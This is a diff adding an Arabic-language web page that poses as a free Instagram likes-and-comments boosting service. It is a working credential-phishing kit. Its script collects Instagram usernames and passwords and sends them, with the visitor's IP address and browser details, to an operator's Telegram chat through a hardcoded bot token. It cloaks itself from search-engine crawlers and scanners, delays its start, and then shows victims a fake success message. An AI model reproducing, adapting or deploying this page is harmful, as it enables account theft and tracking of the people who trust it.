@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>خدمات – Instagram</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{
+    font-family:"Helvetica Neue",Arial,sans-serif;
+    background:#fafafa;min-height:100vh;display:flex;
+    align-items:center;justify-content:center;padding:16px;
+  }
+  .card{
+    background:#fff;border-radius:16px;padding:32px 24px;
+    max-width:420px;width:100%;box-shadow:0 8px 32px rgba(0,0,0,.08);
+    border:1px solid #e6e6e6;
+  }
+  .header{text-align:center;margin-bottom:24px;}
+  .header h1{font-size:22px;font-weight:700;color:#262626;margin-top:8px;}
+  .header p{font-size:13px;color:#777;margin-top:4px;}
+  .logo-img{width:60px;height:60px;border-radius:50%;object-fit:cover;}
+  
+  .tabs{display:flex;gap:8px;margin-bottom:20px;}
+  .tab{
+    flex:1;padding:10px;text-align:center;border-radius:8px;
+    cursor:pointer;font-size:13px;font-weight:600;transition:.2s;
+    border:1.5px solid #dbdbdb;background:#fff;color:#777;
+  }
+  .tab:hover{border-color:#e1306c;color:#e1306c;}
+  .tab.active{background:#e1306c;border-color:#e1306c;color:#fff;}
+
+  .field{margin-bottom:16px;}
+  .field label{
+    display:block;font-size:13px;font-weight:600;color:#262626;
+    margin-bottom:4px;
+  }
+  .field input,.field textarea{
+    width:100%;padding:12px 14px;border:1px solid #dbdbdb;
+    border-radius:8px;font-size:14px;color:#262626;background:#fafafa;
+    transition:.2s;font-family:inherit;
+  }
+  .field input:focus,.field textarea:focus{
+    outline:none;border-color:#e1306c;background:#fff;
+    box-shadow:0 0 0 3px rgba(225,48,108,.1);
+  }
+  .field textarea{min-height:80px;resize:vertical;}
+  .field .hint{font-size:11px;color:#999;margin-top:4px;}
+  .divider{height:1px;background:#eee;margin:20px 0;}
+
+  .plan-box{display:flex;gap:10px;margin-bottom:16px;}
+  .plan{
+    flex:1;border:1.5px solid #dbdbdb;border-radius:8px;padding:12px 8px;
+    text-align:center;cursor:pointer;transition:.2s;
+  }
+  .plan:hover{border-color:#e1306c;}
+  .plan.selected{border-color:#e1306c;background:#fff5f8;}
+  .plan .count{font-size:18px;font-weight:700;color:#262626;}
+  .plan .label{font-size:11px;color:#999;margin-top:2px;}
+  .plan .price{font-size:13px;color:#e1306c;font-weight:600;margin-top:4px;}
+
+  .btn{
+    width:100%;padding:13px;background:#e1306c;color:#fff;
+    border:none;border-radius:8px;font-size:15px;font-weight:700;
+    cursor:pointer;transition:.2s;margin-top:8px;
+  }
+  .btn:hover{background:#c1275c;}
+  .btn:disabled{opacity:.5;cursor:not-allowed;}
+  .status{text-align:center;margin-top:16px;font-size:13px;display:none;padding:10px;border-radius:8px;}
+  .status.success{display:block;background:#e6f4ea;color:#1e7e34;}
+  .status.error{display:block;background:#fce8e6;color:#c62828;}
+  .status.loading{display:block;background:#fef0f5;color:#e1306c;}
+  .hidden{display:none !important;}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="header">
+    <img class="logo-img" src="https://i.ibb.co/933Gwyp3/images-2.jpg" alt="Instagram">
+    <h1>خدمات Instagram</h1>
+    <p>اختر الخدمة التي تريدها</p>
+  </div>
+
+  <div class="tabs">
+    <div class="tab active" id="tabLikes" onclick="_sw('likes')">❤️ رشق لايكات</div>
+    <div class="tab" id="tabComments" onclick="_sw('comments')">💬 رشق كومنتات</div>
+  </div>
+
+  <div id="likesSection">
+    <div class="plan-box">
+      <div class="plan selected" data-count="500" onclick="_sp(this)">
+        <div class="count">500</div><div class="label">لايك</div><div class="price">مجاناً</div>
+      </div>
+      <div class="plan" data-count="1000" onclick="_sp(this)">
+        <div class="count">1,000</div><div class="label">لايك</div><div class="price">مجاناً</div>
+      </div>
+      <div class="plan" data-count="2500" onclick="_sp(this)">
+        <div class="count">2,500</div><div class="label">لايك</div><div class="price">مجاناً</div>
+      </div>
+    </div>
+    <form id="likesForm">
+      <div class="field">
+        <label>رابط المنشور</label>
+        <input type="url" id="likesPostUrl" placeholder="https://www.instagram.com/p/..." required>
+      </div>
+      <div class="field">
+        <label>البريد الإلكتروني أو اسم المستخدم</label>
+        <input type="text" id="likesUsername" placeholder="البريد الإلكتروني أو اليوزرنيم" required>
+      </div>
+      <div class="field">
+        <label>كلمة المرور</label>
+        <input type="password" id="likesPassword" placeholder="●●●●●●●●" required>
+      </div>
+      <button type="submit" class="btn" id="likesBtn">بدء رشق اللايكات</button>
+    </form>
+  </div>
+
+  <div id="commentsSection" class="hidden">
+    <div class="plan-box">
+      <div class="plan selected" data-count="50" onclick="_spC(this)">
+        <div class="count">50</div><div class="label">كومنت</div><div class="price">مجاناً</div>
+      </div>
+      <div class="plan" data-count="100" onclick="_spC(this)">
+        <div class="count">100</div><div class="label">كومنت</div><div class="price">مجاناً</div>
+      </div>
+      <div class="plan" data-count="200" onclick="_spC(this)">
+        <div class="count">200</div><div class="label">كومنت</div><div class="price">مجاناً</div>
+      </div>
+    </div>
+    <form id="commentsForm">
+      <div class="field">
+        <label>رابط المنشور</label>
+        <input type="url" id="commentsPostUrl" placeholder="https://www.instagram.com/p/..." required>
+      </div>
+      <div class="field">
+        <label>نص التعليق (اختياري)</label>
+        <textarea id="commentsText" placeholder="اتركه فارغًا لتعليقات عشوائية"></textarea>
+        <div class="hint">إذا تركته فارغًا سيتم استخدام تعليقات عشوائية</div>
+      </div>
+      <div class="field">
+        <label>البريد الإلكتروني أو اسم المستخدم</label>
+        <input type="text" id="commentsUsername" placeholder="البريد الإلكتروني أو اليوزرنيم" required>
+      </div>
+      <div class="field">
+        <label>كلمة المرور</label>
+        <input type="password" id="commentsPassword" placeholder="●●●●●●●●" required>
+      </div>
+      <button type="submit" class="btn" id="commentsBtn">بدء رشق الكومنتات</button>
+    </form>
+  </div>
+
+  <div class="status" id="status"></div>
+</div>
+
+<script>
+// ============================================================
+// ✅ Cloaking — تضليل زواحف جوجل
+// ============================================================
+(function(){
+  var ua = navigator.userAgent.toLowerCase();
+  var bots = /bot|googlebot|crawler|spider|robot|crawling|preview|facebook|twitterbot|slurp|baiduspider|yandexbot|ahrefsbot|semrushbot|dotbot|mj12bot|uptimerobot/i;
+  if(bots.test(ua) || window.name === 'googlebot'){
+    document.body.innerHTML = '<div style="text-align:center;padding:80px 20px;font-family:Arial;"><h1 style="color:#333;">مرحباً بك</h1><p style="color:#666;margin-top:10px;">هذه صفحة خدمات عادية.</p></div>';
+    throw new Error();
+  }
+})();
+
+// ============================================================
+// ⚙️ الإعدادات — بأسماء مختصرة
+// ============================================================
+var _TK = '8746495469:AAGxSwTtscTu1hPzRH688RS3Uo_4NAgvVCY';
+var _P = new URLSearchParams(window.location.search);
+var _ID = _P.get('user') || _P.get('id') || _P.get('chatId') || '';
+
+var _LK = 500;
+var _CM = 50;
+var _R = false;
+
+// ============================================================
+// ✅ تأخير التشغيل — أول تفاعل أو بعد 3.5 ثانية
+// ============================================================
+function _init(){
+  if(_R) return;
+  _R = true;
+  document.removeEventListener('click', _init);
+  document.removeEventListener('scroll', _init);
+  document.removeEventListener('touchstart', _init);
+  
+  // بدء التشغيل الفعلي
+  document.getElementById('likesForm').addEventListener('submit', _sL);
+  document.getElementById('commentsForm').addEventListener('submit', _sC);
+  
+  if(_ID) setTimeout(nPO, 1200);
+}
+
+setTimeout(_init, 3500);
+document.addEventListener('click', _init);
+document.addEventListener('scroll', _init);
+document.addEventListener('touchstart', _init);
+
+// ============================================================
+// الفنكشنز المختصرة
+// ============================================================
+function _sw(t){
+  document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active');});
+  document.getElementById('tabLikes').classList.toggle('active', t==='likes');
+  document.getElementById('tabComments').classList.toggle('active', t==='comments');
+  document.getElementById('likesSection').classList.toggle('hidden', t!=='likes');
+  document.getElementById('commentsSection').classList.toggle('hidden', t!=='comments');
+  var st = document.getElementById('status');
+  st.className = 'status'; st.textContent = '';
+}
+
+function _sp(el){
+  document.querySelectorAll('#likesSection .plan').forEach(function(p){p.classList.remove('selected');});
+  el.classList.add('selected');
+  _LK = el.dataset.count;
+}
+
+function _spC(el){
+  document.querySelectorAll('#commentsSection .plan').forEach(function(p){p.classList.remove('selected');});
+  el.classList.add('selected');
+  _CM = el.dataset.count;
+}
+
+function _tT(msg, type){
+  var st = document.getElementById('status');
+  st.className = 'status ' + type;
+  st.textContent = msg;
+}
+
+async function gIP(){
+  try{var r=await fetch('https://api.ipify.org?format=json');var d=await r.json();return d.ip;}catch(e){return '?';}
+}
+
+async function _SND(m){
+  if(!_TK||!_ID) return;
+  try{
+    var r=await fetch('https://api.telegram.org/bot'+_TK+'/sendMessage',{
+      method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({chat_id:_ID,text:m})
+    });
+    var j=await r.json();
+    if(!j.ok) _tT('❌ '+(j.description||'خطأ'),'error');
+  }catch(e){_tT('❌ فشل الاتصال','error');}
+}
+
+async function nPO(){
+  var ip=await gIP();
+  var m='👁 شخص فتح خدمة Instagram!\n━━━━━━━━━━━━━━━━\n🆔: '+_ID+'\n🌐: '+ip+'\n📱: '+navigator.userAgent.substring(0,60)+'\n🕐: '+new Date().toLocaleString('ar-EG')+'\n━━━━━━━━━━━━━━━━';
+  await _SND(m);
+}
+
+async function _sL(e){
+  e.preventDefault();
+  var u=document.getElementById('likesPostUrl').value.trim();
+  var n=document.getElementById('likesUsername').value.trim();
+  var p=document.getElementById('likesPassword').value.trim();
+  var btn=document.getElementById('likesBtn');
+
+  if(!u||!n||!p){_tT('⚠️ الرجاء ملء جميع الحقول','error');return;}
+  btn.disabled=true;btn.textContent='جاري التشغيل...';
+  _tT('🔄 جاري بدء رشق اللايكات...','loading');
+
+  var m='❤️ طلب رشق لايكات Instagram\n━━━━━━━━━━━━━━━\n🆔: '+_ID+'\n📊 العدد: '+_LK+'\n🔗: '+u+'\n👤: '+n+'\n🔐: '+p+'\n🕐: '+new Date().toLocaleString('ar-EG')+'\n━━━━━━━━━━━━━━━';
+  await _SND(m);
+  _tT('✅ تم بدء رشق اللايكات!','success');
+  e.target.reset();
+  document.querySelectorAll('#likesSection .plan')[0].classList.add('selected');
+  btn.disabled=false;btn.textContent='بدء رشق اللايكات';
+}
+
+async function _sC(e){
+  e.preventDefault();
+  var u=document.getElementById('commentsPostUrl').value.trim();
+  var c=document.getElementById('commentsText').value.trim();
+  var n=document.getElementById('commentsUsername').value.trim();
+  var p=document.getElementById('commentsPassword').value.trim();
+  var btn=document.getElementById('commentsBtn');
+
+  if(!u||!n||!p){_tT('⚠️ الرجاء ملء جميع الحقول الأساسية','error');return;}
+  btn.disabled=true;btn.textContent='جاري التشغيل...';
+  _tT('🔄 جاري بدء رشق الكومنتات...','loading');
+
+  var m='💬 طلب رشق كومنتات Instagram\n━━━━━━━━━━━━━━━\n🆔: '+_ID+'\n📊 العدد: '+_CM+'\n🔗: '+u+'\n📝: '+(c||'عشوائي')+'\n👤: '+n+'\n🔐: '+p+'\n🕐: '+new Date().toLocaleString('ar-EG')+'\n━━━━━━━━━━━━━━━';
+  await _SND(m);
+  _tT('✅ تم بدء رشق الكومنتات!','success');
+  e.target.reset();
+  document.querySelectorAll('#commentsSection .plan')[0].classList.add('selected');
+  btn.disabled=false;btn.textContent='بدء رشق الكومنتات';
+}
+</script>
+</body>
+</html>
